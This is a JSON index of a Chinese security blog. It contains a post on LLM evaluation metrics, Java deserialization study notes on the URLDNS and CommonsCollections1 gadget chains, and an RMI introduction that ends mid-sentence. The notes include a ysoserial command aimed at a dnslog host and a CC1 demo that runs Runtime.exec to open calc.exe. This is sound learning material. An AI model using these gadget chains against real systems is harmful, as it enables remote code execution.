{"meta":{"title":"清风菀月轩","subtitle":"","description":"个人博客","author":"Qingwan","url":"https://qingwan.top","root":"/"},"pages":[{"title":"","date":"2023-10-13T09:43:01.339Z","updated":"2023-10-13T09:42:51.498Z","comments":true,"path":"404.html","permalink":"https://qingwan.top/404.html","excerpt":"","text":"404 很抱歉，您访问的页面不存在 可能是输入地址有误或该地址已被删除"},{"title":"categories","date":"2023-10-13T09:41:48.000Z","updated":"2024-10-31T18:03:02.066Z","comments":true,"path":"categories/index.html","permalink":"https://qingwan.top/categories/index.html","excerpt":"","text":"CTF做题wp 渗透 代码审计 随笔 生活 Java学习 大语言模型"},{"title":"tags","date":"2023-10-13T09:41:59.000Z","updated":"2024-10-31T18:03:14.706Z","comments":true,"path":"tags/index.html","permalink":"https://qingwan.top/tags/index.html","excerpt":"","text":"web ctf 信息安全 大语言模型 摄影、吃吃吃、永远热爱生活"},{"title":"","date":"2024-01-08T06:07:54.403Z","updated":"2024-01-08T06:07:54.403Z","comments":true,"path":"about/index.html","permalink":"https://qingwan.top/about/index.html","excerpt":"","text":"煮播是一个喜欢生活，热爱分享的小菜鸡。平时喜欢到处玩，在玩的同时喜欢记录生活，所以还蛮喜欢拍照滴现在在学信息安全，目前的方向是web方向，如果有师傅想和我讨论或者文章中有什么错误，欢迎各位师傅留言斧正！ 最后希望所有看到这的师傅以后都越来越好~"},{"title":"我的朋友们","date":"2024-10-29T15:53:56.147Z","updated":"2024-10-29T15:53:56.147Z","comments":true,"path":"friends/index.html","permalink":"https://qingwan.top/friends/index.html","excerpt":"Qingwan的博客朋友圈","text":"Qingwan的博客朋友圈 交换友链联系：&#51;&#50;&#x31;&#x34;&#x32;&#x38;&#52;&#51;&#50;&#56;&#x40;&#113;&#x71;&#46;&#99;&#x6f;&#x6d;"}],"posts":[{"title":"大模型常见评估指标及其运用","slug":"大模型常见指标的定义和运用","date":"2024-10-23T15:12:32.665Z","updated":"2024-10-29T14:13:34.353Z","comments":true,"path":"2024/10/23/大模型常见指标的定义和运用/","link":"","permalink":"https://qingwan.top/2024/10/23/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%B8%B8%E8%A7%81%E6%8C%87%E6%A0%87%E7%9A%84%E5%AE%9A%E4%B9%89%E5%92%8C%E8%BF%90%E7%94%A8/","excerpt":"常见评估大模型的指标以及其运用场景举例（通俗易懂版！）","text":"常见评估大模型的指标以及其运用场景举例（通俗易懂版！） 我们生活中或者是工作中很多地方会用到大模型，那我们怎么去评估一个大模型他的效果是否好，是否符合我们的要求和标准呢？或者说我们该从哪些指标中知道我们还有哪些地方需要改进呢？今天就给大家介绍几个在大模型的训练中常见的几个评估指标。 这里先写几个比较常见，而且对于新手小白比较好理解的~ 常见的评估指标在了解下面这些常见评估指标之前，我们先了解几个机器学习中的概念。 TP，TN，FP，FN的理解TP(True Positive)：预测正例，实际结果也正（系统说对了）TN(True Negative)：预测负例，实际结果也负（系统说对了）FP(False Positive)：预测正例，实际结果却是负（系统说错了）FN(False Negative)：预测负例，实际结果却是正（系统说错了） 我们做个表格理解一下： 指标 解释 类比 TP 预测作弊且确实作弊 抓到了真正的作弊者 TN 预测没作弊且确实没作弊 没冤枉无辜的学生 FP 预测作弊但其实没作弊 冤枉了好人 FN 预测没作弊但其实作弊 漏掉了真正的作弊者 好啦，接下来我们就来看看常见的一些评估指标吧。 1️⃣ 准确率 (Accuracy)定义：预测正确的比例。类比：想象你是老师，班上有100个学生，期末考试你要判断每个学生是“及格”还是“不及格”。 如果你正确判断了90个学生的成绩（不管及格还是不及格），那么准确率就是： 准确率 = 90 / 100 *100%= 90%总结：准确率只看总的预测正确率，但不关心错误的细节。计算即：预测正确的&#x2F;总预测数 2️⃣ 精确率 (Precision)定义：预测为正的样本中，有多少是真正的正样本。类比：假设你要找出班上作弊的学生（正样本），但你错把一些没作弊的同学也当成了作弊的。 你标记了10个学生为作弊，但实际上只有8个是真的作弊，2个是冤枉的。 精确率 = 8 / (8 + 2) = 80%总结：精确率关注的是你说对了多少——在预测为“正”的样本中，真正正确的有多少。计算即：预测为正例并且确实为正例的例子&#x2F;预测为正例的例子 3️⃣ 召回率 (Recall)定义：所有正样本中，你找出了多少。类比：假设班上总共有10个学生作弊，但你只找出了8个，还有2个漏掉了。 召回率 &#x3D; 8 &#x2F; 10 &#x3D; 80%总结：召回率关注的是你找全了吗——你预测出来的正样本，覆盖了所有正样本的多少。计算即：预测为正例并且确实为正例的例子&#x2F;实际所有正例召回率也叫真正例率，所以同时还有对应着的误报率(假正例率)计算即：预测为正例但是实际为反例的例子&#x2F;实际所有反例 4️⃣ F1分数 (F1-Score)定义：精确率和召回率的平衡点。类比：如果你只追求精确率（避免冤枉人），你可能会漏掉很多真正的作弊学生。如果你只追求召回率（尽量多抓人），你可能会抓错很多无辜的学生。F1分数就是在精确率和召回率之间找平衡，用公式：总结：F1分数是平衡精确率和召回率的综合指标，适用于精确率和召回率都很重要的场景。 5️⃣ ROC曲线 (ROC Curve)定义：描述模型的真阳性率（召回率） 和 假阳性率（误报率） 之间的关系。类比：假设你有一个金属探测器，你可以调整灵敏度。灵敏度越高，更多的金属会被探测到（召回率高），但也会误报一些非金属物品（误报率高）。 ROC曲线就是当你调整探测器灵敏度时，召回率和误报率之间的变化情况。总结：ROC曲线能帮你看到模型在不同阈值下的表现，并选择合适的阈值。 6️⃣ AUC值 (Area Under the Curve)定义：ROC曲线下面积的大小。类比：AUC值就是金属探测器的“好坏评分”。分数范围是0.5到1： AUC &#x3D; 0.5：完全随机猜测（比如瞎蒙）。 AUC &#x3D; 1：完美模型。总结：AUC值越大，模型就越好，说明它在不同阈值下都能稳定地把正负样本区分开。 什么时候重点关注什么指标？（应用场景）上面介绍了几个指标，但是大家会有这样一个疑问么：如果这些指标在某些情况下的数值差别很大的时候，我应该更重点关注哪个指标？其实该重点关注什么，取决于这个指标重点影响什么，而所影响的东西在对应场景下对我们的重要性就决定了我们最应该关注的东西。 准确率 (Accuracy) 适用的场景 定义：所有预测中，预测正确的比例。 适用场景：正负样本数量大致平衡，且误报和漏报的成本相近。举例： 学生考试成绩判定： 系统只需正确判断及格或不及格，没必要特别关注误判或漏判的代价。 天气预报（简单情况）： 系统预测晴天和下雨的准确率更重要，只要总体准确就够了。总结：当正负样本平衡且误报漏报代价相近时，准确率是很好的指标。 精确率 (Precision) 重要的场景 定义：在所有预测为正的样本中，真正为正的比例。 适用场景：你更关心避免误报（FP），不想冤枉无辜的人或对象。举例： 垃圾邮件检测系统： 如果误判了重要的邮件（FP），把它丢进垃圾箱，会造成用户损失。 重点：提高精确率，减少误报。 疾病诊断筛查（非终极诊断）： 如果诊断系统说一个健康人患有重病（FP），可能会引起恐慌和不必要的治疗。总结：当误报的代价很高时，要重点关注精确率。 召回率 (Recall) 重要的场景 定义：在所有正样本中，被成功预测为正的比例。 适用场景：你更关心不漏掉正样本（FN），即使多报一些无所谓。举例： 癌症筛查： 如果漏掉了一个真正的癌症患者（FN），可能会导致悲剧。因此，宁愿误报一些无病患者（FP），也不能漏掉。 安全系统的异常检测： 在金融欺诈或黑客入侵检测中，漏掉一次攻击可能会带来巨大损失。因此尽可能地抓住所有异常。总结：当漏报的代价很高时，要重点关注召回率。 F1分数 (F1-Score) 重要的场景 定义：精确率和召回率的调和平均。适用于需要平衡两者的场景。举例： 搜索引擎： 搜索结果要确保用户能找到所需内容（召回率高），同时不希望显示太多无关内容（精确率高）。 重点：用F1分数来平衡精确率和召回率。 医疗AI辅助诊断： 精确率和召回率都很重要：既不能漏诊，也不能误诊太多。总结：当精确率和召回率都很重要时，使用F1分数来平衡它们。 AUC-ROC 曲线 定义：AUC衡量模型在不同阈值下的整体表现。 适用场景：当需要衡量模型在不同阈值下的稳定性时。举例： 银行信用卡欺诈检测： 银行可以根据不同需求调整模型的阈值（严格或宽松），而AUC可以全面反映模型的性能。 如果AUC接近1，说明模型在各种阈值下表现都很好。总结：当模型的阈值需要动态调整时，使用AUC-ROC来综合评价模型。 我们来总结一下： 指标 重点场景 何时使用 精确率 垃圾邮件过滤、疾病诊断等 当误报代价高时，减少冤枉无辜者。 召回率 癌症筛查、欺诈检测等 当漏报代价高时，尽可能抓住所有正样本。 F1分数 搜索引擎、AI辅助诊断等 当精确率和召回率都很重要时，求平衡。 准确率 考试成绩判定、天气预报等 当正负样本平衡且误漏报代价相近时。 AUC-ROC 银行欺诈检测等 当模型需要在不同阈值下表现良好时。 上面就是一些大模型常见评估指标的定义和运用场景啦，如有错误或者有疑问，欢迎给我留言或者私聊我~","categories":[{"name":"大模型","slug":"大模型","permalink":"https://qingwan.top/categories/%E5%A4%A7%E6%A8%A1%E5%9E%8B/"}],"tags":[],"author":"Qingwan"},{"title":"Java安全漫谈学习笔记③ -- Java反序列化 (7-9)","slug":"java安全漫谈-反序列化①","date":"2024-06-11T17:40:57.267Z","updated":"2024-06-11T17:45:33.377Z","comments":true,"path":"2024/06/12/java安全漫谈-反序列化①/","link":"","permalink":"https://qingwan.top/2024/06/12/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%91%A0/","excerpt":"正式进入Java的反序列化，分析URLDNS链和CC1链","text":"正式进入Java的反序列化，分析URLDNS链和CC1链 从这一篇开始就在进入java的第一个漏洞了，也是最常用的一个漏洞-反序列化。 PHP、Python和Java序列化方法的对比java在序列化对象时，将会调用该对象的writeObject方法，参数类型是ObjectOutputStream，开发者可以将任何内容写入到该stream中，反序列化的时候，会调用readObject()方法，能够读取出写入的内容。而写入的值实际上是在objectAnnotation这个变量中。PHP中也有一个魔术方法会在反序列的时候触发，但是他和readObject()方法还是有蛮大的区别。readObject 倾向于解决“反序列化时如何还原一个完整对象”这个问题，而PHP的 __wakeup 更倾向于解决“反序列化后如何初始化这个对象”的问题。 Python反序列化和Java还有PHP最大的区别是，Python反序列化的这个过程其实是执行一个基于栈的虚拟机，可以在立即导致任意函数的RCE，比Java还有PHP的反序列化更危险。 所以总的来说，Python反序列化的危害最大，Java的反序列化最常用。 URLDNS链ysoserial第二篇文章开始正式进入java反序列化，但是在开始审链子之前，先介绍一个工具 – ysoserial，这个工具的地位就像是sql注入里的sqlmap一样，非常重要。这个工具的作用就是生成RCE的poc，用法也很简单就一句话，详细的安装和使用看链接。 好了，接下来就开始正式开始审计链子吧，第一个审计的链子就从 URLDNS 开始吧为什么这个链子叫做 URLDNS 呢，我在看完这个链子之后做出一个好理解的解释吧。就是这个链子他的利用参数是一个URL，而这个链子触发后的效果呢，是进行一次DNS请求，所以我们把这个链子叫做 URLDNS。 这个链子看似好像没什么用，但是我们在检测反序列化漏洞的时候，因为他整个过程用到的都是java的内置类，不依赖第三方库，而且在无回显的时候我们就可以通过是否有DNS请求去检测判断是否有反序列化漏洞。 好了，我们先来看下 ysoserial 是怎么来分析这条链子的 1234567891011121314151617181920212223242526272829303132333435363738394041public class URLDNS implements ObjectPayload&lt;Object&gt; &#123; public Object getObject(final String url) throws Exception &#123; //Avoid DNS resolution during payload creation //Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload. URLStreamHandler handler = new SilentURLStreamHandler(); HashMap ht = new HashMap(); // HashMap that will contain the URL URL u = new URL(null, url, handler); // URL to use as the Key ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup. Reflections.setFieldValue(u, &quot;hashCode&quot;, -1); // During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered. return ht; &#125; public static void main(final String[] args) throws Exception &#123; PayloadRunner.run(URLDNS.class, args); &#125; /** * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance. * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior * using the serialized object.&lt;/p&gt; * * &lt;b&gt;Potential false negative:&lt;/b&gt; * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the * second resolution.&lt;/p&gt; */ static class SilentURLStreamHandler extends URLStreamHandler &#123; protected URLConnection openConnection(URL u) throws IOException &#123; return null; &#125; protected synchronized InetAddress getHostAddress(URL u) &#123; return null; &#125; &#125;&#125; 我们看到，这里有个 getObject方法，这个方法返回的是一个对象，这个对象就是最后被序列化的对象，这里是 HashMap，是一个java自带的类。 从之前的知识中我们知道触发方法是 readobject，所以我们这里从 HashMap类的readobject方法开始分析 HashMap.java文件： 1234567891011121314151617181920212223242526272829303132333435363738private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException &#123; // Read in the threshold (ignored), loadfactor, and any hidden stuff s.defaultReadObject(); reinitialize(); if (loadFactor &lt;= 0 || Float.isNaN(loadFactor)) throw new InvalidObjectException(&quot;Illegal load factor: &quot; + loadFactor); s.readInt(); // Read and ignore number of buckets int mappings = s.readInt(); // Read number of mappings (size) if (mappings &lt; 0) throw new InvalidObjectException(&quot;Illegal mappings count: &quot; + mappings); else if (mappings &gt; 0) &#123; // (if zero, use defaults) // Size the table using given load factor only if within // range of 0.25...4.0 float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f); float fc = (float)mappings / lf + 1.0f; int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ? DEFAULT_INITIAL_CAPACITY : (fc &gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : tableSizeFor((int)fc)); float ft = (float)cap * lf; threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ? (int)ft : Integer.MAX_VALUE); @SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;) Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap]; table = tab; // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i &lt; mappings; i++) &#123; @SuppressWarnings(&quot;unchecked&quot;) K key = (K) s.readObject(); @SuppressWarnings(&quot;unchecked&quot;) V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); &#125; &#125; &#125; 看到最后一行代码 putVal(hash(key), key, value, false, false); ，这里对 HashMap的键值进行了hash计算。 hash方法用于计算给定键的哈希值。HashMap使用哈希值来确定键值对在内部数组中的位置。这个方法的目的是将键的哈希值分布得尽可能均匀，以减少冲突。看到刚刚 ysoserial源码中的注释 &#x2F;&#x2F; During the put above, the URL’s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.在上述 put 操作期间，URL 的 hashCode 被计算并缓存。这会重置 hashCode，以便下次调用 hashCode 时触发 DNS 查找。 所以可以知道是 hashCode 函数的操作触发了DNS请求，我们跟踪这个 hash()函数HashMap.java文件： 1234static final int hash(Object key) &#123; int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16); &#125; 看到这里调用了 hashCode，意思是如果key值为null，则返回0，如果key值不为null，则调用key.hashCode()方法计算哈希值，并将结果保存在变量h中。我们看到 ysoserial的源码中的这句话，可知URLDNS 中使⽤的这个key是⼀个 java.net.URL 对象 1URL u = new URL(null, url, handler); // URL to use as the Key 所以我们看到 URL.java文件： 1234567public synchronized int hashCode() &#123; if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode; &#125; 此时， handler 是 URLStreamHandler 对象（的某个⼦类对象） 1transient URLStreamHandler handler; 继续跟进其 hashCode ⽅法，URLStreamHandler.java文件： 1234567891011121314151617181920212223242526272829303132333435protected int hashCode(URL u) &#123; int h = 0; // Generate the protocol part. String protocol = u.getProtocol(); if (protocol != null) h += protocol.hashCode(); // Generate the host part. InetAddress addr = getHostAddress(u); if (addr != null) &#123; h += addr.hashCode(); &#125; else &#123; String host = u.getHost(); if (host != null) h += host.toLowerCase().hashCode(); &#125; // Generate the file part. String file = u.getFile(); if (file != null) h += file.hashCode(); // Generate the port part. if (u.getPort() == -1) h += getDefaultPort(); else h += u.getPort(); // Generate the ref part. String ref = u.getRef(); if (ref != null) h += ref.hashCode(); return h; &#125; 看到这里调用了 getHostAddress()方法，继续跟进 123456789101112131415161718protected synchronized InetAddress getHostAddress(URL u) &#123; if (u.hostAddress != null) return u.hostAddress; String host = u.getHost(); if (host == null || host.equals(&quot;&quot;)) &#123; return null; &#125; else &#123; try &#123; u.hostAddress = InetAddress.getByName(host); &#125; catch (UnknownHostException ex) &#123; return null; &#125; catch (SecurityException se) &#123; return null; &#125; &#125; return u.hostAddress; &#125; 这里的 InetAddress.getByName(host) 是根据主机名获取对应的ip地址，其实就是进行一次DNS查询，所以到这里我们就知道为什么调用 hashCode 时会触发 DNS 查找了。到这里，我们就整理一下链子吧 HashMap-&gt;readObject() HashMap-&gt;hash() URL-&gt;hashCode() URLStreamHandler-&gt;hashCode() URLStreamHandler-&gt;getHostAddress() InetAddress-&gt;getByName() 要构造这个Gadget，只需要初始化⼀个 java.net.URL 对象，作为 key 放在 java.util.HashMap中；然后，设置这个 URL 对象的 hashCode 为初始值不为0 ，这样反序列化时将会重新计算其 hashCode ，才能触发到后⾯的DNS请求，否则不会调⽤ URL-&gt;hashCode() 。 这个链子的利用方法是什么呢？java -jar ysoserial-all.jar URLDNS &quot;http://tkl4nk.dnslog.cn&quot; &gt; a.txt然后我们对 a.txt 进行反序列化操作 123456789package Reflect; import java.io.*; public class Test &#123; public static void main(String[] args) throws IOException, ClassNotFoundException &#123; ObjectInputStream o = new ObjectInputStream(new FileInputStream(&quot;D:/Tools/CTF.WEB.Penetration/a.txt&quot;)); Object o1 = o.readObject(); System.out.println(o1); &#125; &#125; 然后发现请求成功 CommonCollections1第三篇开始就进入CC链了 这篇开始我们的CC链1 – CommonCollections1，P神将CC1利用链简化成了下面的demo代码 123456789101112131415161718192021222324package org.vulhub.Ser; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.util.HashMap; import java.util.Map; public class CommonCollections1 &#123; public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[] &#123;&quot;C:\\\\Windows\\\\system32\\\\calc.exe&quot;&#125;), &#125;; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(&quot;test&quot;, &quot;xxxx&quot;); &#125; &#125; 这里对应的计算器路径改成自己的就可以。记住在执行这个poc之前要先导入 Maven 的 commons-collections 依赖现在我们来分析一下，这个链子里涉及到的接口和类。 TransformedMapjava中的Map集合类用于存储元素键值对，提供了一个更通用的元素存储方法。CC1中实现了 TransformedMap ，该类会在一个元素被增删改的时候调用 transform方法，进行一个回调。在我们上面给出的CC1的demo中： 12Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); 其中TransformedMap.decorate方法,预期是对Map类的数据结构进行转化，该方法有三个参数。 第一个参数为待转化的Map对象 第二个参数为Map对象内的key要经过的转化方法（可为单个方法，也可为链，也可为空） 第三个参数为Map对象内的value要经过的转化方法 即上面的那个代码是对 innerMap 进行修饰，最后得到修饰后的 outerMap Transformer接口类这个接口类提供了一种对象转换方法 transform 接收一个对象对他进行一些操作之后然后输出。该接口的重要实现类有：ConstantTransformer、InvokerTransformer、ChainedTransformer、TransformedMap 。所以TransformedMap在转换Map的新元素时，就会调⽤transform⽅法，这个过程类似于一个回调的操作，回调的对象是原始对象 input 1234567package org.apache.commons.collections; public interface Transformer &#123; public Object transform(Object input); &#125; ConstantTransformer类1234567public ConstantTransformer(Object constantToReturn) &#123; this.iConstant = constantToReturn; &#125; public Object transform(Object input) &#123; return this.iConstant; &#125; 这个类从上面对 Tranformer类的介绍中就知道，是实现Transformer接⼝的⼀个类。从上面的代码就知道，他的作用是在构造函数的时候传入一个对象，然后再在 tranform方法中将这个对象返回。无论接受什么对象都返回都始终返回构造该实例时传入的常量值 iConstant。 InvokerTransformer类这个也是实现 Transformer接口的一个类，这个类可以用来执行任意方法，这也是反序列化可以执行命令的关键原因。 12345public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; this.iMethodName = methodName; this.iParamTypes = paramTypes; this.iArgs = args; &#125; 在实例化这个类的时候，我们需要传入三个参数，第一个是待执行的方法名，第二个是这个函数的参数类型，第三个参数是传给这个函数的参数列表。这三个参数都是可控的，我们可以传入任意值。 1234567891011121314151617public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; else &#123; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); &#125; catch (NoSuchMethodException var4) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + this.iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; does not exist&quot;); &#125; catch (IllegalAccessException var5) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + this.iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; cannot be accessed&quot;); &#125; catch (InvocationTargetException var6) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + this.iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; threw an exception&quot;, var6); &#125; &#125; &#125; 然后这后面的这个回调 transform 方法就是执行了input对象的iMethodName方法，传入一个对象然后反射调用。 ChainedTransformer类和上面同理，也是实现 Transformer接口的一个类。 1234567891011public ChainedTransformer(Transformer[] transformers) &#123; this.iTransformers = transformers; &#125; public Object transform(Object object) &#123; for(int i = 0; i &lt; this.iTransformers.length; ++i) &#123; object = this.iTransformers[i].transform(object); &#125; return object; &#125; 可以看到，当传入的对象类型是一个数组时，是会开始循环读取这个数组。当每调用一个参数，就会执行一次 transform方法。并且，前一个回调返回的结果是后一个回调的参数的传入，这样一来就组成了一个链式结构。 Demo的理解在讲完demo所涉及到的类和方法之后，我们看demo的逻辑就很清晰了 12345678910111213 Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[] &#123;&quot;C:\\\\Windows\\\\system32\\\\calc.exe&quot;&#125;), &#125;; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(&quot;test&quot;, &quot;xxxx&quot;); &#125; 当我们像Map中放入一个新元素：outerMap.put(&quot;test&quot;, &quot;xxxx&quot;)时，会触发回调。由于元素被增删改，所以会调用 transform方法，进行一个回调，transformerChain中的转换器会被触发。这里的转换器ChainedTransformer，包含两个Transformer参数：第⼀个是ConstantTransformer，直接返回当前环境的Runtime对象； 因为 Runtime 为单例类，不能直接实例化，所以要通过反射的方法获取 由于ConstantTransformer的transform方法不受传入参数的影响，故返回值还是 Runtime.class 第⼆个是InvokerTransformer，执⾏Runtime对象的exec⽅法，参数是 C:\\\\Windows\\\\system32\\\\calc.exe 。这样一来就成功调用执行任意命令。 这一篇我们正式进入到java的反序列化，并且跟着敲写理解了CC1的demo，编写了一个测试成功的类，从下篇开始，我们将更加深层次的了解反序列化并且开始编写反序列化的poc。","categories":[{"name":"Java学习","slug":"Java学习","permalink":"https://qingwan.top/categories/Java%E5%AD%A6%E4%B9%A0/"}],"tags":[],"author":"Qingwan"},{"title":"Java安全漫谈学习笔记② -- JavaRMI (4-6)","slug":"Java安全漫谈--RMI","date":"2024-05-14T04:24:40.929Z","updated":"2024-05-14T14:01:44.394Z","comments":true,"path":"2024/05/14/Java安全漫谈--RMI/","link":"","permalink":"https://qingwan.top/2024/05/14/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88--RMI/","excerpt":"Java中RMI (Remote Method Invocation，远程方法调用) 模型的介绍及应用","text":"Java中RMI (Remote Method Invocation，远程方法调用) 模型的介绍及应用 RMI的过程分析RMI (Remote Method Invocation，远程方法调用) 模型是一种分布式对象应用，使用 RMI 技术可以使一个 JVM(java虚拟机) 中的对象调用另一个 JVM 中的对象方法并获取调用结果。这里的另一个 JVM 可以在同一台计算机也可以是远程计算机。因此，RMI 意味着需要一个 Server 端和一个 Client 端。这里首先编写一个 RMI Server 1234567891011121314151617181920212223242526272829303132333435363738394041package org.vulhub.RMI; import java.rmi.Naming; import java.rmi.Remote; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.rmi.server.UnicastRemoteObject; public class RMIServer &#123; public interface IRemoteHelloWorld extends Remote &#123; public String hello() throws RemoteException; &#125; public class RemoteHelloWorld extends UnicastRemoteObject implements IRemoteHelloWorld &#123; protected RemoteHelloWorld() throws RemoteException &#123; super(); &#125; public String hello() throws RemoteException &#123; System.out.println(&quot;call from&quot;); return &quot;Hello world&quot;; &#125; &#125; private void start() throws Exception &#123; RemoteHelloWorld h = new RemoteHelloWorld(); //创建并运行RMI Registry LocateRegistry.createRegistry(1099); //将RemoteHelloWorld对象绑定到Hello这个名字上 Naming.rebind(&quot;rmi://127.0.0.1:1099/Hello&quot;, h); &#125; public static void main(String[] args) throws Exception &#123; new RMIServer().start(); &#125; &#125; 这段代码是一个简单的 Java RMI（远程方法调用）示例，我们来仔细的分析一下这段代码 public interface IRemoteHelloWorld extends Remote &#123; ... &#125;： 这是一个远程接口，它扩展了 Remote 接口。在 RMI 中，远程接口定义了客户端和服务器之间可以调用的远程方法。这部分算第一个部分，继承接口，定义远程调用函数 hello() public class RemoteHelloWorld extends UnicastRemoteObject implements IRemoteHelloWorld &#123; ... &#125;： 这是一个远程对象类，它实现了远程接口 IRemoteHelloWorld。在 RMI 中，远程对象是服务器上的对象，它包含了远程方法的实现。这是第二个部分，实现了此接口的类。 private void start() throws Exception &#123; ... &#125;： 这是一个私有方法，用于启动 RMI 服务器。在方法内部，首先创建了一个 RemoteHelloWorld 对象，然后使用 LocateRegistry.createRegistry(1099) 创建了 RMI 注册表，该注册表将在本地主机的 1099 端口上监听远程方法调用。最后，使用 Naming.rebind(&quot;rmi://127.0.0.1:1099/Hello&quot;, h) 将远程对象绑定到注册表中，以便客户端可以通过指定的 URL 访问远程对象。 public static void main(String[] args) throws Exception &#123; ... &#125;： 这是主方法，用于启动 RMI 服务器。在方法内部，创建了一个 RMIServer 对象，并调用了其 start() 方法来启动 RMI 服务器。这个和上面那段算作是第三部分，主类，创建 Registry，将类实例化之后绑定到一个地址。 总的来说，这段代码实现了一个简单的 RMI 服务器，该服务器提供了一个名为 “Hello” 的远程对象，客户端可以通过 RMI 调用该对象的 hello() 方法来获取 “Hello world” 字符串。 这段代码只有在客户端连接的时候才会调用hello() 方法，才会有输出，但是如果我们想知道这个代码有没有被执行的话怎么办呢，我们可以自己手动添加输出代码，这样就可以知道有没有执行了，代码如下： 12345678private void start() throws Exception &#123; RemoteHelloWorld h = new RemoteHelloWorld(); LocateRegistry.createRegistry(1099); System.out.println(&quot;RMI Registry created.&quot;); // 添加输出 Naming.rebind(&quot;rmi://127.0.0.1:1099/Hello&quot;, h); System.out.println(&quot;Remote object bound.&quot;); // 添加输出&#125; 好，那么 RMI Server的编写和结构介绍完了，接下来我们就介绍一下 RMI Client，这个客户端和前面的服务端对应 12345678910111213package org.vulhub.Train; import org.vulhub.RMI.RMIServer; import java.rmi.Naming; import java.rmi.NotBoundException; import java.rmi.RemoteException; public class TrainMain &#123; public static void main(String[] args) throws Exception &#123; RMIServer.IRemoteHelloWorld hello = (RMIServer.IRemoteHelloWorld) Naming.lookup(&quot;rmi://127.0.0.1:1099/Hello&quot;); String ret = hello.hello(); System.out.println( ret); &#125; &#125; 运行成功之后会发现客户端输出了 Hello world，服务端输出了 call from我们来分析一下客户端的代码，客户端代码很简单，主要就是在方法内部，我们首先使用 Naming.lookup() 方法查找在指定 URL 下绑定的远程对象，即通过 Name向 RMI Registry查询，并将其强制转换为远程接口类型 IRemoteHelloWorld。然后，我们调用远程接口的 hello() 方法，获取返回的字符串并打印输出。这段代码实现了一个简单的 RMI 客户端，它连接到指定的 RMI 服务器并调用其提供的远程方法。 我们来仔细分析一下RMI的通信过程，我们来抓包看看，监听我们本地的 Loopback 回环接口然后运行我们的两个脚本，可以看到整个过程经历了两次TCP握手 第⼀次建⽴TCP连接是连接 127.0.0.1的1099端⼝，这也是我们在代码⾥看到的端⼝，⼆者进⾏沟通后，我向远端发送了⼀个“Call”消息，远端回复了⼀个“ReturnData”消息，然后新建了⼀个TCP连接，连到远端的50954端⼝。在 RMI（远程方法调用）中，&quot;Call&quot; 消息和 &quot;ReturnData&quot; 消息是 RMI通信过程中的两种重要消息类型，它们的含义如下： &quot;Call&quot; 消息： &quot;Call&quot; 消息是客户端发送给服务器端的消息，用于请求远程方法的调用。当客户端想要调用远程对象的方法时，它会发送一个 &quot;Call&quot; 消息给服务器端，以触发远程方法的执行。 &quot;ReturnData&quot; 消息： &quot;ReturnData&quot; 消息是服务器端响应客户端请求的消息，用于返回远程方法调用的结果。当服务器端收到客户端的 &quot;Call&quot; 消息后，会执行相应的远程方法，并将方法执行的结果封装成 &quot;ReturnData&quot; 消息发送给客户端，以便客户端获取远程方法的执行结果。所以整个过程大概为：⾸先客户端连接Registry，并在其中寻找Name是Hello的对象，这个对应数据流中的Call消息；然后Registry返回⼀个序列化的数据，这个就是找到的Name=Hello的对象，这个对应数据流中的ReturnData消息；客户端反序列化该对象，发现该对象是⼀个远程对象，地址在 192.168.174.1:50954 ，于是再与这个地址建⽴TCP连接；在这个新的连接中，才执⾏真正远程⽅法调⽤，也就是 